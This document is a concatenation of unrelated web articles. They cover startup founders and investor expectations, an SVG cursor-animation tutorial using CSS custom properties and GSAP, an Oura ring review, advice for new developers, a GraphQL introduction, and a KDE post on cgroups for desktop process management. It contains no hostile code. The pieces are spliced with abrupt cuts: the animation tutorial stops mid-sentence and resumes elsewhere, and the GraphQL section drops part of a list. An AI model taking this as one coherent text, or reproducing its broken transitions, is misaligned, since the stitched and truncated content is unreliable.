<p><iframe title="Start with why -- how great leaders inspire action | Simon Sinek | TEDxPugetSound" width="500" height="375" src="https://www.youtube.com/embed/u4ZoJKF_VuA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

<p><span>If an investor doesn’t know </span><b>why</b><span> you are creating your startup what incentive do they have to invest in you; as opposed to the thousands of other founders out there. If they can’t be sure their money is in the hands of an intelligent, capable, trustworthy founder they are unlikely to commit to a deal.</span></p>
<p><span>Moreover, they aren’t just planning to invest capital in your business but also their valuable time. They are looking to create a long-term business relationship with you and share their expertise and network. If they don’t like or trust you they simply won’t do it.</span></p>
<p><span>Your character is a critical factor and potential investors will want to answer the following questions about you:</span></p>
<ul>
<li><span><strong>Competency</strong> – “Can you do this?” Is the question nearly all financial backers will want the answer to. Demonstrating competence is challenging, but can be made easier if you have been part of (or already founded) a successful startup.&nbsp;</span></li>
<li><span><strong>Commitment</strong> – Are you totally invested in your startup? Are you still working for someone else or have you taken the leap?&nbsp; How hard do you work?&nbsp;</span></li>
<li><span><strong>Honesty</strong> – Do you tell the truth? Any lies you tell will inevitably backfire. </span><a href="https://www.hbs.edu/faculty/Pages/profile.aspx?facId=6560" target="_blank" rel="noopener noreferrer"><span>Howard Stevenson</span></a><span> (Professor Emeritus at Harvard Business School) sums it up perfectly: “The first time you hear anything dishonest come out of a founder’s mouth, you should run, not walk”</span></li>
<li><span><strong>Trustworthiness</strong> – More than telling the truth, do you keep your word and deliver on your promises?</span></li>
<li><span><strong>Who you are underneath it all</strong> – Aside from the above are you the kind of person they will be happy to introduce to their professional networks? Will they enjoy working with you over the next three to five years?&nbsp;</span></li>
</ul>
<h3><b>Confidence</b></h3>
<p><span>It may seem obvious but you need to be confident that you, your idea and your team can overcome the inevitable challenges of founding a startup. You will need to get used to hearing no from investors, clients, banks and even family and friends. It’s important to develop a thick skin and generate self-confidence no matter the hurdles that arise.</span></p>
<p><span>However, there is a fine line between confidence and arrogance – and it’s a line you will need to tread carefully. Overconfidence and arrogance will make you look like a “know-it-all” to investors. If they decide that you won’t be open to guidance and new ideas it will be a deal-breaking red flag and they will walk away. The best way to ensure that you’re portraying confidence and not arrogance is to support your claims with facts and figures.&nbsp;</span></p>
<h3><b>Coachability</b></h3>
<p><span>Do you listen well? Can you learn quickly and effectively? These are two factors essential for investors. They want to feel their time (and money) is well spent and that they are investing in a founder who is open to learning and being mentored.&nbsp;</span></p>
<p><span>A good (smart money) investor will want to nurture a mentor-mentee relationship with you. A receptive mind is a vital quality that you will need. </span><a href="https://www.forbes.com/profile/ron-conway/#4900daef67ac" target="_blank" rel="noopener noreferrer"><span>Ron Conway</span></a><span>, an active early-stage investor in Google and Paypal (and Founder of </span><a href="https://www.svangel.com/index" target="_blank" rel="noopener noreferrer"><span>SV Angel</span></a><span>) puts it this way:&nbsp;</span></p>
<h3><strong><span><i>“Coachability enables a willingness to be open and make the necessary and often numerous course corrections and morphing that startups require.”&nbsp;</i></span></strong></h3>
<h3><b>The Red Flags &amp; Dealbreakers for Investors</b></h3>
<p><span>There are seven “deadly sins” that will leave you investor-less and could potentially harm your reputation. Here they are and how you can avoid them:&nbsp;</span></p>
<h4>1. Dishonesty</h4>
<p><span>As I mentioned before lies inevitably backfire. Lying about any aspect of your business (or yourself) will plant a seed of doubt into the minds of any potential investor. They will do the necessary research into you and your company to verify your claims before they open their wallets – so be upfront and honest at all times.&nbsp;</span></p>
<h4>2. Telling Them you Have “No Competition”</h4>
<p><span>Even if your product is the most innovative product the world has ever seen you will either be disrupting an existing market or creating a new market that will quickly fill with investors.&nbsp;</span></p>
<h4>3. Saying you “Only Need 1% of the Market Share”<span>&nbsp;</span></h4>
<p><span>This is a great way to show investors that you don’t understand sales or customer CPA (cost-per-acquisition). Instead of talking in market share talk in customers. Specifically how many you need, how much you will spend to get them and how long it will take for you to get to that number.&nbsp;</span></p>
<h4>4. Failing to Fulfil Your Commitments</h4>
<p><span>When asked about what might kill a potential deal for her clients </span><a href="https://www.linkedin.com/in/marciasnelson/" target="_blank" rel="noopener noreferrer"><span>Marcia Nelson</span></a><span> Managing Director of </span><a href="https://www.alberleen.com/" target="_blank" rel="noopener noreferrer"><span>Alberleen Family Office Solutions</span></a><span> said on aspect is when a “startup’s management takes too long to get us requested information – while it may not kill a deal, it will certainly make us more cautious.” Investors want to know that you take your commitments seriously and that you are prepared to fulfil requests in a timely manner.&nbsp;</span></p>
<h4>5. Being Desperate</h4>
<p><span>Desperation can break a business partnership before it begins and shows investors that you are unconfident.&nbsp;</span></p>
<h4>6. Being Arrogant or Defensive<span>&nbsp;</span></h4>
<p><span>As I mentioned above confidence and arrogance are close neighbours and it’s important not to come off too strong.&nbsp;</span></p>
<h4>7. An Unwillingness to Listen</h4>
<p><span>Own your weaknesses. Investors will be put off if you act like you have all the answers and don’t need any help. You will need guidance and help on your journey and investors already know that. If you admit your faults and actively seek advice you will be left with a much healthier and more productive business relationship.&nbsp;</span></p>
<p><span>As a founder, it is </span><b>your responsibility</b><span> to make as easy as possible for investors to say yes to both you and your startup. You have to put yourself in the best position to form a great partnership that will be a lucrative deal for all parties involved. And the next step in that process is choosing your founding team,</span></p>
<h2><span>Choosing Your Co-Founders&nbsp;</span></h2>
<p><span>The founder who will lead the company isn’t necessarily the inventor. It is someone who believes in the startup’s idea and product. So much so that they are willing to put their future on the line to turn that idea into a successful company.</span></p>
<p><span>You should try and choose professionals that have the skills you lack. Someone who has a skillset to offer in another part of the business. Their skills should complement yours.&nbsp;</span></p>
<p><span>Another important factor is ensuring your values, expectations and business goals are aligned. You and your co-founders will become your startup’s core management team. It’s important to be on the same page when it comes to your startup’s mission, business goals, values and timeline.</span></p>
<p><span>You need to ask yourself if your personalities are compatible. </span><a href="https://techcrunch.com/2017/02/18/co-founder-conflict/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZm9yYmVzLmNvbS9zaXRlcy9reWxld29uZy8yMDE4LzA3LzI2L2hvdy10by1waWNrLXRoZS1yaWdodC1jb2ZvdW5kZXJzLWFuZC13aHktaXQtaW1wcm92ZXMteW91ci1jdXN0b21lci1leHBlcmllbmNlLw&amp;guce_referrer_sig=AQAAAEtIKZoxIkLDJGeNlqJVPCniIv_oDI2VMfIzQ8MoJFst1Y1LpVPlj_dgeGnWBxvuTx9vTEPU8-Lvvf4l34V7ZmlCoi71qW367ATIsBoEnNZ0Pybpbb0jkw9IphJ8mm-GJetR8PtNUn8-Pv5Rvdh2cXfZ_aO-Kk5hLP--l9aOGQXp" target="_blank" rel="noopener noreferrer"><span>Gary Tan</span></a><span>, Managing Partner at Initialized Capital and previously at YCombinator puts it perfectly:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*k0NpSqRY3Ufsv_kH" alt="Gary Tan: Co-founder disputes have historically been one of the top reasons startups fail" width="720" height="440" data-image-id="0*k0NpSqRY3Ufsv_kH" data-width="752" data-height="460"></figure>
<p><span>Will you be able to embrace the conflict with this person? Discussing disagreements on a level playing field to improve your business?&nbsp;</span></p>
<p><span>It comes down to one overarching question:</span></p>
<h4><b>Can you work together over a long period of time? </b></h4>
<p><span>After all, what good is it if their hard skills complement yours if you don’t actually like the person you have chosen as your cofounder?&nbsp;</span></p>
<p><span>Investors will take the dynamics of your relationship into account as they assess if your startup will be the right fit for their portfolio. As well as assessing your co-founder on the same essential qualities they judged you on.&nbsp;</span></p>
<p><span>I recommend that you thoroughly and carefully consider a business partner as you would a life partner. Ask yourself, if in the toughest times will that person remember that you are both on the same team and be by your side? More importantly, will they be an asset to your business.&nbsp;</span></p>
<p><span>Serial entrepreneur, </span><a href="https://twitter.com/amiller" target="_blank" rel="noopener noreferrer"><span>Andy Miller’s</span></a><span> formula is simple: </span><b>People</b><span> + </span><b>Execution </b><span>= </span><b>Success</b><span>. Your potential investors are counting on you and your startup management team to execute on your business plan, gain traction and, ultimately, bring in revenue no matter the hurdles.&nbsp;</span></p>
<p><span>Your founding team’s primary responsibility is to plan your journey to market that avoids potential roadblocks. Then, when unexpected roadblocks do inevitably appear, you and your founding team use that plan to navigate them.&nbsp;</span></p>
<p><span>As </span><a href="https://www.linkedin.com/in/seansheppard/" target="_blank" rel="noopener noreferrer"><span>Sean Sheppard</span></a><span> puts it:&nbsp;</span></p>
<h3><strong><span><i>“Most companies and innovations fail, and the reasons have to do with markets and the behaviours of the people who are running them, not the products themselves”.</i></span></strong></h3>
<p><span>You need to be able to trust and count on your co-founders. Choose correctly and you will have a strong foundation on which to move onto the next step: building a startup team.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>I'm so excited to have <em>finally</em> launched my website.</p><p>This was one of my favourite bits to make <strong>by far</strong>. A little animated me that responds to the cursor position.</p><p data-height="580" data-theme-id="dark" data-preview="true" data-default-tab="result" data-user="cassie-codes" data-slug-hash="WNQqZJG" data-pen-title="lil' me."><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/WNQqZJG">lil' me.</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>In this post we'll cover how to get values from the mouse movement and plug them into an animation.</p><p>This is my <strong>favourite</strong> thing about SVG animation. Not mouse movement in particular, but interactivity. Exporting animation as an mp4 is cool and all. But you can't <em>play</em> with it.</p><p>Animating on the web opens up so many cool possibilities!</p><p>If you're the kind of person who learns best by digging into the code, then just go ahead and fork that pen, have fun!</p><hr><p>Still here? 😊 Cool beans, let's go through it together.</p><p>I use <a href="https://greensock.com/">Greensock</a> for all my SVG animation. There are a few reasons for this. Firstly, it gives you more control and is super fun to use. But more importantly, as browsers implement the SVG spec differently, animating can get a bit messy. The team at Greensock put a lot of effort into harmonizing behavior across browsers.</p><p>Under the hood though, Greensock is just a really performant property manipulator. It will manipulate (pretty much) whatever value you want to change. In this case it's updating the values in a matrix transform. Check this out.</p><p><img src="https://www.cassie.codes/images/cursor.gif" alt="gif of matrix transforms updating with dev tools open" loading="lazy"></p><p>Cool right! Greensock is great at this kind of thing, but there's a lot going on in this pen, so let's break it down into chunks and focus on one bit at a time. First up, the mouse interaction. We'll come back to Greensock in a bit!</p><h2 id="heading-mouse-movement-fun!">Mouse movement fun!<a href="#heading-mouse-movement-fun!"><span role="text"> permalink</span></a></h2><p>So, there's another way we can modify values in CSS with Javascript. <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS custom properties!</a></p><p data-height="500" data-theme-id="dark" data-default-tab="result" data-user="cassie-codes" data-slug-hash="OJMOLML" data-pen-title="Mouse movement demo"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/OJMOLML">Mouse movement demo</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>Let's walk through the process. The goal is to get the x and y position of the cursor as we move our mouse about, and then we can use those values to update some custom properties.</p><p>In the previous gif Greensock is using matrix transforms, which are more performant. But we're going to use <code>transform: translate(x,y)</code> for this as it's a tad more readable, and we can use percentage values.</p><p>First up, we declare some custom properties for the x and y values and then use those custom properties in place of regular property values in our transform.</p><pre><code><span><span>:root</span> <span>{</span></span><br><span>  <span>--mouse-x</span><span>:</span> 0<span>;</span></span><br><span>  <span>--mouse-y</span><span>:</span> 0<span>;</span></span><br><span><span>}</span></span><br><span></span><br><span><span>.pointer</span> <span>{</span></span><br><span>  <span>transform</span><span>:</span> <span>translate</span><span>(</span><span>var</span><span>(</span>--mouse-x<span>)</span><span>,</span> <span>var</span><span>(</span>--mouse-y<span>)</span><span>)</span><span>;</span></span><br><span><span>}</span></span></code></pre><p>Then we need to get our mouse coordinates. We can do this by listening to the mouse movement and getting the mouse's coordinates with <code>clientX</code> and <code>clientY</code></p><p>We'll assign those values to some global variables so that we can access them in another function later.</p><pre><code><span><span>let</span> xPosition<span>;</span></span><br><span><span>let</span> yPosition<span>;</span></span><br><span></span><br><span></span><br><span><span>function</span> <span>updateMouseCoords</span><span>(</span><span>event</span><span>)</span> <span>{</span></span><br><span>  xPosition <span>=</span> event<span>.</span>clientX<span>;</span></span><br><span>  yPosition <span>=</span> event<span>.</span>clientY<span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'mousemove'</span><span>,</span> updateMouseCoords<span>)</span><span>;</span></span></code></pre><p>Now we've got our coordinates, lets use them to update our custom properties and move our pointer around!</p><p>😇 When animating things on the web it's important to pay attention to performance. We can't know for sure how many times a users mouse event will fire as it's implementation specific. If it fires more than 60 times per second (which is the average refresh rate for most browsers) we'll end up with unnecessary computation. So to avoid burning up everyone's laptop fans and melting their CPU we can use <code>requestAnimationFrame</code></p><p>Request animation frame allows us to make smoother, browser optimized animations. If the user changes tabs, the animation will stop and give the CPU a break. You call the function once to start, and then it recusively calls itself.</p><p>⚠️ This is a great way to crash your browser if you get some code wrong!</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  </span><br><span>  <span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>Right now, the x and y position we're getting back from <code>event.clientX</code> and <code>event.clientY</code> are pixel values, this isn't really useful to us. If we plug them straight into our custom properties we could end up transforming our pointer hundreds of pixels off in one direction.</p><p data-height="500" data-theme-id="dark" data-default-tab="result" data-user="cassie-codes" data-slug-hash="5ed677605b34f86eeb488b4b2a9bfe6a" data-pen-title="Mouse movement demo"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/5ed677605b34f86eeb488b4b2a9bfe6a">Mouse movement demo</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>We need to convert those pixel values into percentages of the window height and width.</p><p>Let's define some global variables for the window width and height and work out the percentage values.</p><pre><code><span><span>let</span> windowHeight <span>=</span> window<span>.</span>innerHeight<span>;</span></span><br><span><span>let</span> windowWidth <span>=</span> window<span>.</span>innerWidth<span>;</span></span><br><span></span><br><span><span>function</span> <span>percentage</span><span>(</span><span>partialValue<span>,</span> totalValue</span><span>)</span> <span>{</span></span><br><span>  <span>return</span> <span>(</span><span>100</span> <span>*</span> partialValue<span>)</span> <span>/</span> totalValue<span>;</span></span><br><span><span>}</span></span><br><span></span><br><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  x <span>=</span> <span>percentage</span><span>(</span>xPosition<span>,</span> windowWidth<span>)</span><span>;</span></span><br><span>  y <span>=</span> <span>percentage</span><span>(</span>yPosition<span>,</span> windowHeight<span>)</span><span>;</span></span><br><span></span><br><span>  window<span>.</span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>This will give us a range from 0 -

First we have to include the core library, if you're on codepen, you can go to your pen settings and search for greensock.</p><p><img src="https://www.cassie.codes/images/gsap-include.png" alt="pen settings on codepen" loading="lazy"></p><p>Now we've got the GSAP library in our pen, we can take advantage of <code>gsap.ticker()</code></p><p>The greensock ticker is like the heartbeat of the GSAP engine - under the hood it uses requestAnimationFrame, just like we were using, but if that isn’t supported, the ticker automatically falls back to using a regular setTimeout() loop.</p><p>So rather than calling our function with request animation frame, we would do this...</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  </span><br><span><span>}</span></span><br><span></span><br><span>gsap<span>.</span>ticker<span>.</span><span>add</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>Aside from making structuring animation itself more intuitive, Greensock provides a load of super cool utility functions that make your life easier.

<p>I have been using the <a href="https://ouraring.com/">Oura sleep tracking ring</a> for almost two years now. I immediately fell in love with the form factor, as I can’t stand watches or bracelets.</p>



<div><figure><a href="https://ouraring.com/"><img src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;ssl=1" alt="" width="256" height="156" srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" sizes="(max-width: 256px) 100vw, 256px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" data-lazy-src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<h2>When do I wear it?</h2>



<p>I used to wear it all the time, but then switched to night-only. I’m not interested in tracking my steps or any of the other activity features. </p>



<p>It also provides an interesting airport security case study: </p>



<p>Turns out that airport security doesn’t care about the Oura ring. Every time I try to put it off, they say “no no, keep the ring on”, and it never beeped or anything, even though it’s an electronic device.</p>



<h2>Main use cases?</h2>



<p>I mainly use it to observe my body temperature at night. It’s a great early warning system for infections.</p>



<p>Also for my “readiness”. It indicates how restful my night was, informing the intensity of my workouts. I‘ve especially found that “low readiness” combined with an “intense workout” is a really bad combination. Instead I use the earliest signs to „listen to my body“</p>



<p>Another important factor is seeing if I got enough REM sleep.</p>



<h2>What have I learned so far?</h2>



<p>I’ve learned that <a href="https://remo.org/2020/05/28/bedtime/" data-type="1791">time in bed doesn’t equal time asleep</a>. Just because you’ve been in bed for 7 hours doesn’t mean you slept for 7 hours. It’s more likely that you slept 6. Based on my ring, my own difference is 30 to 60 minutes per night.</p>



<p>I’ve also learned more about my sleep cycle. For the first few hours, my body focuses on deep sleep. Towards the morning, the focus is shifted to REM sleep. To feel fully rested, I both need enough deep as well as REM sleep. Especially the REM sleep seems to be the most important factor for me.</p>



<h2>Sick vs. Healthy</h2>



<p>Here is a comparison between me being sick and healthy. Your sleep quality is always summarized into a “readiness” score, which makes it easily comparable.</p>

<h2>How accurate is it?</h2>



<p>At the time I bought the ring, author of <a href="https://www.amazon.de/Why-We-Sleep-Science-Dreams/dp/0141983760/ref=sr_1_1?ie=UTF8&amp;qid=1534409176&amp;sr=8-1&amp;keywords=why+we+sleep&amp;tag=remouherek-21">Why We Sleep</a>, Matthew Walker, has said that this ring was probably the most accurate sleep tracking device for retail consumers. As I loved Matthew’s book, I trust his judgement.</p>



<h2>Hardware</h2>



<p>The battery lasts for 5-7 days, which is fine. The ring does introduce a new charging device to your life—but I guess we got used to charging device inflation, right?</p>



<p>I also like that the ring is waterproof, so you can wash your hands with it, or take a shower. </p>



<p>After 9 months, I had to have my ring replaced on warranty, because the battery life dropped to 1-2 days, and the whole process was very smooth. I never had any problems with my second ring.</p>



<h2>Software</h2>



<p>I love the mobile app. The ring connects via bluetooth and the syncing takes about 20 seconds. The ring receives regular firmware updates, which are also performed through the app.</p>



<h2>Conclusion</h2>



<p>If you care about your sleep and health, I highly recommend using the <a href="https://ouraring.com/">Oura ring</a>.</p>



<p>As a last comment, I strongly believe that the company should be acquired by Apple, as I believe that it would fit nicely into the Apple wearables ecosystem and provide a wonderful new form factor.</p>

						<!--kg-card-begin: markdown--><p>Yepp, more things I wish I'd known when I started, 4th edition.</p>
<p><em>You can find the first article in the series <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-to-program/">here</a>.</em></p>

<h2 id="lovemaintenanceworkoratleastlearntoappreciateit">Love maintenance work or at least learn to appreciate it</h2>
<p>Very few things are more despised by programmers than doing maintenance work and working with legacy apps.</p>
<p>This can be counterproductive, as most of the work available involves doing exactly that. Companies have running systems, some built a long time ago, and someone needs to maintain that code. This is especially true if you are starting at an entry position, where you'll most likely work on some old application the company has been running for more than a decade.</p>
<p>We love working on new projects for several reasons:</p>
<ul>
<li>We can choose which technology to use.</li>
<li>We can flex our creatives muscles and create something cool.</li>
<li>There's a lot of freedom when designing the solution.</li>
<li>You get to work on The Next Big Thing and all the credit it carries.</li>
</ul>
<p>The huge difference between how we perceive maintenance work and new project development is a sad thing. On one hand, most of the really important job with high impact happens on those legacy systems, whereas The Next Big Thing often goes bust. On the other hand, that cool new app will be legacy as soon as it hits production and you start receiving new requirements.</p>
<p>We should start seeing maintenance work under a more positive light. After all, most of the value provided to end users happens on those systems. We could exercise our creative muscles by refactoring and improving the design, or increasing the test coverage, all proper challenges for developers of any level.</p>
<p>Learn to love maintenance work, it's most likely what you'll spend doing most of the time as a programmer.</p>
<h2 id="makeaccomplishmentsvisible">Make accomplishments visible</h2>
<p>You are an awesome developer, always finishing tasks on time, writing ultra-complete test suites and providing to customers exactly what they want. You do a great job every day and work extra hard to ship those last-minute features. Then, that time of the year when promotions are given arrives and you... you are still in the same position?</p>
<p>I know it can be extremely frustrating, and you might end up resenting management. After all, aren't you always doing an outstanding job? how dare they pass this chance to show me how much they appreciate my hard work!</p>
<p>In reality, managers are just too busy to keep track of your accomplishments. It's your responsibility to make your contribution visible to management.</p>
<p>It doesn't even require too much effort. Keep a list of the most important things you accomplish every week, and send small reports at the end of the week listing what you accomplished. You don't need to generate a fancy document: an email with bullet points will do.</p>
<p>It has two important advantages:</p>
<ul>
<li>Management doesn't need to pester you to get an idea of what you are doing at work.</li>
<li>You keep a registry of your accomplishments, which is useful for negotiating raises and other things.</li>
</ul>
<p>Take a proactive stance on the way management evaluates you, one of the biggest mistakes you can make is to outsource that responsibility to people who are already too busy with other things. Management will appreciate it, and so will you.</p>
<h2 id="fighttheimpostersyndrome">Fight the imposter syndrome</h2>
<p>Congratulations!</p>
<p>You got your first software development job. The idea of being interviewed made you feel very anxious, but you studied hard and aced the whole thing. Finally, you arrive at the office on your first day and...</p>
<p>And it's terrifying. Suddenly, you feel like a Jon Snow who knows nothing, and self-doubt starts to creep in. What if they find out I am not that smart? do I really deserve this job? am I a fraud? how long will it take them before they find out I'm a fraud and the horrible mistake they made by hiring me?</p>
<p>The following weeks don't help that much. Perhaps it's a technology you are not that familiar with, or maybe they ask you to work on some dark corner of their massive legacy application. Solving the tasks take you twice (or more) as long as the estimate, and you grow more and more anxious.</p>
<p>Been there, more than once.</p>
<p>It's all normal, the good old imposter syndrome. It's this feeling that you are fake, and that you don't deserve to be there. It will go away after a couple of weeks and you'll start to feel more confident. Ramp-up takes time, and in truth, no one really expects you to be 100% productive from the start. Your employer knows it will take some months before you know what you are doing, so don't punish yourself that hard.</p>
<p>Keep working hard, in no time you will become an important part of the team and your contributions will start to have an impact. We've all felt it, and I guarantee you it will go away. So keep up the good work!</p>

July 2, 2020 | https://blog.graphqleditor.com/introduction-to-graphql/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/introduction-to-graphql/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>GraphQL is a new approach</strong> for building an API that aims to get the better of two basic <strong>RESTful APIs limitations</strong> which are data filters &amp; relationships. These two classic REST flaws force REST users to always get the full payload in response &amp; hit multiple data sources separately.</p>
<h2>What is GraphQL</h2>
<p><strong>GraphQL is a data query and manipulation language</strong> for APIs created and open-source by Facebook to solve the problem of unoptimized data flow in their mobile app. In general, GraphQL is a syntax that describing the way of requesting data from the server. The main difference comparing Graph QL to traditional REST API is that the response format is described in the query and defined by the client rather than the server. Another important thing about GraphQL is that it is language agnostic.</p>
<h2>Basic structure</h2>
<p>The core notion of using GraphQL is a <em>schema</em>.  Designing a schema is one of the first steps in the development process, casting a shadow over the rest of the project. A carefully planned Graph QL schema is the core of a well-designed and secure product. GraphQL Schema is a center-piece of any Graph QL project and it strictly defines its structure &amp; regulates how the data can be accessed.</p>
<h5>GraphQL Queries &amp; Mutations</h5>
<p>There are two basic types of GrahQL operations which are GraphQL Queries &amp; GraphQL Mutations:</p>
<ul>
<li><em>GraphQL Queries</em> - query allows you to read or fetch data from the server-side,</li>

<p>The performed operations have a form of a string that a GraphQL server can parse and respond to with requested data in a specific format i.e JSON.</p>
<h5>GraphQL Resolvers</h5>
<p>In order to understand what we are querying for the GraphQL server needs to have a defined set of functions/rules that our server would use to generate the response. These functions are called GraphQL Resolvers and they are responsible for handling our queries.</p>

<h2>GraphQL vs REST</h2>
<p>Imagine we want to retrieve posts from a company blog using RESTful API. First, we need to <code>GET api/posts</code>, but posts have other data like authors so we need to call REST API again to get the details of the posts i.e. authors ending up with two server requests instead of one, and as you continue to scale, you may have even more requests to different endpoints in order to fetch all the needed data. </p>
<p>The performance drop, especially on slow cellular connections,  was the main problem Facebook engineers observed, and the urge to find its solution was a substructure for GraphQL. In GraphQL API we have a single endpoint being able to process complex requests. You query the GraphQL server for specific data and it will respond with what was requested, which results in fewer bits transferred over the wire.</p>

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
